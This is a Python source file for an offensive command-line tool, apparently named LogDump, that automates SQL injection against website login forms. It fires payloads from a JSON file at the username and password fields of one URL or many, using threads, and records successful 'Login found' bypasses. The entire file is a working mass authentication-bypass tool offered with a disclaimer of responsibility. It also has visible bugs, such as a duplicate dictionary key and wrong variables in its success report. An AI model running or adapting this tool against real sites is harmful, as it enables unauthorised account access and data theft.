import os
import requests
import logging
import concurrent.futures
import random
import time
import json
import sys
import os
import sys
import time

if os.name == "nt":  # Check if the OS is Windows
    os.system("cls")  # Clear the screen for Windows OS
else:
    os.system("clear")  # Clear the screen for Unix-like OS

class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLEU = '\033[34m'

banner = {'''
          
          #Author  : Hackfut
          #Contact : t.me/HackfutSec
          #License : MIT  
          [Warning] I am not responsible for the way you will use this program [Warning]

         ██╗░░░░░░█████╗░░██████╗░██████╗░██╗░░░██╗███╗░░░███╗██████╗░
         ██║░░░░░██╔══██╗██╔════╝░██╔══██╗██║░░░██║████╗░████║██╔══██╗
         ██║░░░░░██║░░██║██║░░██╗░██║░░██║██║░░░██║██╔████╔██║██████╔╝
         ██║░░░░░██║░░██║██║░░╚██╗██║░░██║██║░░░██║██║╚██╔╝██║██╔═══╝░
         ███████╗╚█████╔╝╚██████╔╝██████╔╝╚██████╔╝██║░╚═╝░██║██║░░░░░
         ╚══════╝░╚════╝░░╚═════╝░╚═════╝░░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░░░░
        
        >  Here is the program description with numbered points:
        # The program automates SQL injection testing on login pages by sending payloads (injection strings) into the username and password fields.
        # It can test either a single URL provided by the user or multiple URLs read from a file.
        # The results are logged into separate files for successes and errors.
        # The program uses a retry mechanism with exponential backoff to handle network errors.
        # Finally, it performs the tests concurrently using multi-threading to speed up the process
'''}

for col in banner:
    print(bcolors.BLEU + col, end="")
    sys.stdout.flush()
    time.sleep(0.00005)

# Configure Logging
logging.basicConfig(filename='test_injections.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
error_logger = logging.getLogger('error')
error_logger.setLevel(logging.ERROR)
error_file_handler = logging.FileHandler('error_injections.log')
error_logger.addHandler(error_file_handler)

success_logger = logging.getLogger(bcolors.GREEN + 'success')
success_logger.setLevel(logging.INFO)
success_file_handler = logging.FileHandler('success_injections.log')
success_logger.addHandler(success_file_handler)

def load_payloads(file_path='payloads.json'):
    """
    Load payloads from a JSON file.
    """
    if not os.path.exists(file_path):
        print(bcolors.RED + f"\n[✘] The payload file '{file_path}' does not exist.")
        sys.exit(1)
    
    with open(file_path, 'r') as file:
        payloads = json.load(file)
    
    return payloads

def exponential_backoff_retry(func, *args, **kwargs):
    """
    Retry function with exponential backoff.
    """
    retries = 5
    delay = 1  # Initial delay in seconds
    
    for i in range(retries):
        try:
            return func(*args, **kwargs)
        except requests.exceptions.RequestException as e:
            logging.error(f"Request error: {e}")
            if i < retries - 1:
                time.sleep(delay)
                delay *= 2  # Double the delay for each retry
            else:
                raise  # Raise the exception if retries are exhausted

def test_authentication(url, payload, username_field='username', password_field='password'):
    """
    Test login authentication using a payload.
    Returns True if authentication succeeds, otherwise False.
    """
    data = {username_field: payload, password_field: payload, username_field: 'admin'}
    
    try:
        response = exponential_backoff_retry(requests.post, url, data=data, timeout=10)
        if response.status_code == 200:
            if bcolors.RED + "incorrect" not in response.text.lower() and "error" not in response.text.lower():
                success_logger.info(bcolors.GREEN + f"Success for {url} with payload {payload}")
                return True
    except requests.exceptions.Timeout:
        error_logger.warning(f"Timeout while connecting to {url}")
    except requests.exceptions.RequestException as e:
        error_logger.error(f"Request error for {url}: {e}")
    
    return False

def validate_url(url):
    """
    Validate if the URL starts with http:// or https://.
    """
    if not url.startswith(('http://', 'https://')):
        raise ValueError(bcolors.RED + f"\n[✘]Invalid URL '{url}'. It must start with 'http://' or 'https://'.")
    return url

def validate_file(filename):
    """
    Validate if the file exists.
    """
    if not os.path.exists(filename):
        raise ValueError(bcolors.RED + f"\n[✘] The file '{filename}' does not exist.\n")
    return filename

def test_single_url(username_field, password_field):
    """
    Test a single URL provided by the user.
    """
    url = input(bcolors.YELLOW + "\n[!] Enter the URL to test (e.g., http://example.com/login.php or admin.asp,aspx): ")
    try:
        url = validate_url(url)
    except ValueError as e:
        print(e)
        return

    payloads = load_payloads()  # Load payloads from an external file

    for payload in payloads:
        print(bcolors.YELLOW + f"\n[!] Testing with payload: {payload}")
        if test_authentication(url, payload, username_field, password_field):
            success_logger.info(bcolors.GREEN + f"Login found for {url} with payload {payload}")
            print(bcolors.GREEN + f"\n[✔] Login found with payload: {payload} on URL {url}")
            with open("results.txt", "a") as f:
                f.write(f"Login found: {url} with payload: {payload}\n")
            break
    else:
        print("\n[✘] No valid login found with the provided payloads.")

def test_multiple_urls(username_field, password_field):
    """
    Test multiple URLs provided from a file.
    """
    filename = input(bcolors.YELLOW + "\n[!] Enter the path to the file containing the URLs to test: ")

    try:
        filename = validate_file(filename)
    except ValueError as e:
        print(e)
        return

    filter_keywords = input(bcolors.YELLOW + "\n[!] Enter the keywords to filter URLs (separated by commas): ").split(',')
    
    with open(filename, "r") as file:
        urls = file.readlines()

    valid_urls = [url.strip() for url in urls if any(keyword in url for keyword in filter_keywords)]

    if not valid_urls:
        print(bcolors.RED + "\n[✘]No valid URLs found in the file.")
        return

    print(bcolors.BLEU + f"\n[✓] Valid URLs: {valid_urls}")
    payloads = load_payloads()  # Load payloads from an external file

    max_workers = os.cpu_count()  # Use the number of CPU cores for threads
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for url in valid_urls:
            for payload in payloads:
                futures.append(executor.submit(test_authentication, url, payload, username_field, password_field))

        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                print(bcolors.GREEN + f"\n[✓] Login found with payload {payload} for URL {url}")
                with open("results.txt", "a") as f:
                    f.write(f"Login found: {url} with payload: {payload}\n")
                break

def main():
    """
    Main function to test a single or multiple URLs.
    """
    username_field = input(bcolors.YELLOW + "\n[!] Username field name (default 'username'): ") or 'username'
    password_field = input(bcolors.YELLOW + "\n[!] Password field name (default 'password'): ") or 'password'
    
    choice = input(bcolors.YELLOW + "\n[!] Do you want to test a single URL (1) or multiple URLs from a file (2)? (1/2): ")
    
    if choice == "1":
        test_single_url(username_field, password_field)
    elif choice == "2":
        test_multiple_urls(username_field, password_field)
    else:
        print(bcolors.RED + "\n[!] Invalid choice. Please choose '1' or '2'.")

if __name__ == "__main__":
    main()
